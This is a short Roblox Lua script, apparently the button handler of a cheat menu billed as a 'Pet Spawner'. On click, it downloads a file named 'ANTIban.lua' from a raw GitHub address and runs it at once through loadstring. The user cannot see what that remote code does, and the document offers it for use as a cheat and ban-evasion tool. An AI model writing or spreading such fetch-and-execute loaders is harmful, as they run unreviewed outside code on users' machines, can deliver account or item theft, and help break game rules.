-- FIXED PET SPAWNER EXECUTION
local function WBQPKO_fake_script() -- script_2.LocalScript 
    local script = Instance.new('LocalScript', script_2)

    local actionButton = script.Parent
    local warningFrame = actionButton.Parent
    local debounce = false
    
    actionButton.MouseButton1Click:Connect(function()
        if debounce then return end
        debounce = true
    
        -- Visual feedback
        local originalText = actionButton.Text
        actionButton.Text = "EXECUTING..."
        actionButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        updateStatus("Loading Pet Spawner...", Color3.fromRGB(255, 255, 0))
    
        -- Execute the external script - FIXED URL AND EXECUTION
        local success, err = pcall(function()
            -- First, get the script content
            local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/ANTIban.lua")
            -- Then execute it
            loadstring(scriptContent)()
        end)
    
        -- Close the warning frame regardless of success
        warningFrame.Visible = false
    
        -- Handle results
        if success then
            actionButton.Text = "SUCCESS!"
            updateStatus("Pet Spawner loaded!", Color3.fromRGB(0, 255, 0))
        else
            actionButton.Text = "ERROR!"
            updateStatus("Error: "..tostring(err):sub(1, 50), Color3.fromRGB(255, 0, 0))
            warn("Pet Spawner execution failed:", err)
        end
    
        -- Reset after 1 second
        task.wait(1)
        actionButton.Text = originalText
        actionButton.BackgroundColor3 = Color3.fromRGB(31, 206, 0)
        debounce = false
    end)
end
coroutine.wrap(WBQPKO_fake_script)()

